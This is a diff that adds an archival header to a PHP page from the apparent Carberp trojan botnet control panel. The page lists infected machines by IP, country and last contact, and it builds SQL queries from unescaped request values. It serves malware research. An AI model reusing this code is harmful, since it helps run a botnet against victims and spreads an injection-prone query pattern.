@@ -1,11 +1,24 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 get_function('html_pages');
 get_function('ts2str');
 include_once('modules/bots/country_code.php');
 
-if(empty($Cur['str'])){	$Cur['str'] = 'ALL';
+if(empty($Cur['str'])){
+	$Cur['str'] = 'ALL';
 	$smarty->assign('title', $lang['bots'] . ' - ' . $lang['allcountr']);
-}else{	$smarty->assign('title', $lang['bots'] . ' - ' . $country_code[$Cur['str']]);
+}else{
+	$smarty->assign('title', $lang['bots'] . ' - ' . $country_code[$Cur['str']]);
 }
 
 if(isset($_POST['prefix'])){ $_SESSION['search'][$Cur['str']]['prefix'] = $_POST['prefix']; }
@@ -23,14 +36,19 @@ if(empty($_SESSION['search'][$Cur['str']]['type_life'])){
 	$_SESSION['search'][$Cur['str']]['type_life'] = 'last_date';
 }
 
-if($_SESSION['user']->config['hunter_limit'] == true){	$_SESSION['search'][$Cur['str']]['post_id'] = $_SESSION['user']->id;
-}else{	unset($_SESSION['search'][$Cur['str']]['post_id']);
+if($_SESSION['user']->config['hunter_limit'] == true){
+	$_SESSION['search'][$Cur['str']]['post_id'] = $_SESSION['user']->id;
+}else{
+	unset($_SESSION['search'][$Cur['str']]['post_id']);
 }
 
 $filter = '';
 $sort = '';
 
-if(count($_SESSION['search'][$Cur['str']])){	foreach($_SESSION['search'][$Cur['str']] as $key => $value){	    if(!empty($value)){			switch($key){
+if(count($_SESSION['search'][$Cur['str']])){
+	foreach($_SESSION['search'][$Cur['str']] as $key => $value){
+	    if(!empty($value)){
+			switch($key){
 				case 'prefix':
 					if(empty($filter) && $Cur['str'] == 'ALL'){ $filter = ' WHERE ';}else{$filter .= ' AND ';}
 					$filter .= '(prefix = \''.$value.'\') ';
@@ -57,7 +75,8 @@ if(count($_SESSION['search'][$Cur['str']])){	foreach($_SESSION['search'][$Cur['
 				break;
 
 				case 'sort':
-	            	switch($value){	            		case 'conn1':
+	            	switch($value){
+	            		case 'conn1':
 	            			$sort .= ' ORDER by last_date ASC';
 	            		break;
 
@@ -81,14 +100,16 @@ if(count($_SESSION['search'][$Cur['str']])){	foreach($_SESSION['search'][$Cur['
 
 if($Cur['str'] == 'ALL'){
 	$list = $mysqli->query('SELECT id,prefix,uid,ip,last_date FROM bf_bots ' . $filter . $sort . ' LIMIT ' . (($Cur['page'] == 0) ? $_SESSION['user']->config['cp']['bots_country'] : $Cur['page']*$_SESSION['user']->config['cp']['bots_country'] . ',' . $_SESSION['user']->config['cp']['bots_country']), null, null, false);
-}else{	$list = $mysqli->query('SELECT id,prefix,uid,ip,last_date FROM bf_bots WHERE (country = \''.$Cur['str'].'\') ' . $filter . $sort . ' LIMIT ' . (($Cur['page'] == 0) ? $_SESSION['user']->config['cp']['bots_country'] : $Cur['page']*$_SESSION['user']->config['cp']['bots_country'] . ',' . $_SESSION['user']->config['cp']['bots_country']), null, null, false);
+}else{
+	$list = $mysqli->query('SELECT id,prefix,uid,ip,last_date FROM bf_bots WHERE (country = \''.$Cur['str'].'\') ' . $filter . $sort . ' LIMIT ' . (($Cur['page'] == 0) ? $_SESSION['user']->config['cp']['bots_country'] : $Cur['page']*$_SESSION['user']->config['cp']['bots_country'] . ',' . $_SESSION['user']->config['cp']['bots_country']), null, null, false);
 }
 
 $list_count = count($list);
 if($_SESSION['user']->config['cp']['bots_country'] <= count($list)){
 	if($Cur['str'] == 'ALL') {
 		$counts['alls'] = $mysqli->query_name('SELECT COUNT(id) count FROM bf_bots ' . $filter, null, 'count', 0, 60);
-	}else{		$counts['alls'] = $mysqli->query_name('SELECT COUNT(id) count FROM bf_bots WHERE (country = \''.$Cur['str'].'\')' . $filter, null, 'count', 0, 60);
+	}else{
+		$counts['alls'] = $mysqli->query_name('SELECT COUNT(id) count FROM bf_bots WHERE (country = \''.$Cur['str'].'\')' . $filter, null, 'count', 0, 60);
 	}
 }else{
 	$counts['alls'] = $list_count;
@@ -107,7 +128,8 @@ if(empty($_SESSION['user']->config['prefix'])){
 }
 $smarty->assign("prefix", $prefix);
 
-if($Cur['ajax'] == 1){	print('<script type="text/javascript" language="javascript">document.title = \''.$smarty->tpl_vars['title']->value.'\';</script>');
+if($Cur['ajax'] == 1){
+	print('<script type="text/javascript" language="javascript">document.title = \''.$smarty->tpl_vars['title']->value.'\';</script>');
 }
 
 ?>
